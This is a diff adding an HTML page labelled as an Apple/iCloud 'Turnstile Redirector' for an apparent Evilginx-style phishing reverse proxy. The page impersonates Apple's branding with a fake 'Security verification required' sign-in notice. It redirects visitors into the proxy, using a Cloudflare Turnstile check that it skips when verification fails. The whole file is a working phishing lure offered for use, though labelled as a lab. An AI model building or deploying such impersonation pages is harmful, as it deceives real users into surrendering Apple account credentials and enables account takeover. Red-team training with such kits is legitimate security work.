@@ -1,0 +1,176 @@
+<!-- Apple/iCloud Turnstile Redirector for EvilGin LAB RProxy -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification - Apple</title>
+    <link rel="icon" href="https://www.apple.com/favicon.ico" type="image/x-icon">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f5f7;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #1d1d1f;
+        }
+        .container {
+            background: #ffffff;
+            padding: 48px 40px;
+            border-radius: 18px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 440px;
+            width: 100%;
+        }
+        .apple-logo {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 32px;
+            fill: #1d1d1f;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1d1d1f;
+        }
+        .subtitle {
+            font-size: 17px;
+            color: #86868b;
+            margin-bottom: 32px;
+            line-height: 24px;
+        }
+        .security-info {
+            background: #f5f5f7;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .security-info h2 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1d1d1f;
+        }
+        .security-info p {
+            font-size: 15px;
+            color: #86868b;
+            line-height: 22px;
+            margin: 0;
+        }
+        .loading-container {
+            margin: 32px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #e5e5e7;
+            border-top-color: #0071e3;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status-text {
+            font-size: 15px;
+            color: #86868b;
+        }
+        .footer {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e5e5e7;
+            font-size: 12px;
+            color: #86868b;
+        }
+        .footer a {
+            color: #0071e3;
+            text-decoration: none;
+        }
+        .footer a:hover { text-decoration: underline; }
+        #cf-turnstile { display: none; }
+        @media (max-width: 480px) {
+            .container { margin: 16px; padding: 32px 24px; }
+            h1 { font-size: 24px; }
+        }
+    </style>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+    <div class="container">
+        <svg class="apple-logo" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+        </svg>
+        <h1>Security verification required</h1>
+        <div class="subtitle">To help protect your account, we need to verify that it's really you trying to sign in.</div>
+        <div class="security-info">
+            <h2>Why am I seeing this?</h2>
+            <p>You're signing in from a new location, device, or browser. This extra security step helps keep your account safe.</p>
+        </div>
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="status-text" id="status-text">Verifying your request...</div>
+        </div>
+        <noscript><p style="color: #ff3b30;">JavaScript is required.</p></noscript>
+        <div id="cf-turnstile"></div>
+        <div style="margin-top: 30px;">
+            <a id="manual-redirect-btn" href="#" onclick="performManualRedirect(); return false;" style="display: inline-block; padding: 12px 24px; background: #0071e3; color: white; text-decoration: none; border-radius: 980px; font-size: 17px; font-weight: 400;">Continue</a>
+        </div>
+        <div class="footer">
+            <a href="https://www.apple.com/privacy/" target="_blank">Privacy</a> • 
+            <a href="https://www.apple.com/legal/" target="_blank">Terms</a>
+        </div>
+    </div>
+    <script>
+        const TURNSTILE_SITEKEY = 'YOUR_TURNSTILE_SITE_KEY';
+        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/";
+        function performRedirect() { window.location.href = REDIRECT_URL; }
+        function performManualRedirect() { if (REDIRECT_URL) window.location.href = REDIRECT_URL; }
+        if (typeof turnstile === 'undefined') {
+            document.querySelector('.status-text').textContent = 'Completing verification...';
+            setTimeout(performRedirect, 2000);
+        } else {
+            turnstile.ready(function () {
+                let verificationTimeout = setTimeout(function() {
+                    document.querySelector('.status-text').textContent = 'Completing verification...';
+                    setTimeout(performRedirect, 500);
+                }, 5000);
+                try {
+                    turnstile.render('#cf-turnstile', {
+                        sitekey: TURNSTILE_SITEKEY,
+                        callback: function(token) {
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                            setTimeout(performRedirect, 800);
+                        },
+                        'error-callback': function(error) {
+                            clearTimeout(verificationTimeout);
+                            document.querySelector('.status-text').textContent = 'Bypassing verification...';
+                            setTimeout(performRedirect, 1000);
+                        }
+                    });
+                } catch (e) {
+                    clearTimeout(verificationTimeout);
+                    setTimeout(performRedirect, 1500);
+                }
+            });
+        }
+        setTimeout(function() {
+            if (REDIRECT_URL) {
+                document.querySelector('.status-text').textContent = 'Verification complete. Redirecting...';
+                var btn = document.getElementById('manual-redirect-btn');
+                if (btn) btn.href = REDIRECT_URL;
+                try { window.location.href = REDIRECT_URL; } catch (e) { window.location = REDIRECT_URL; }
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
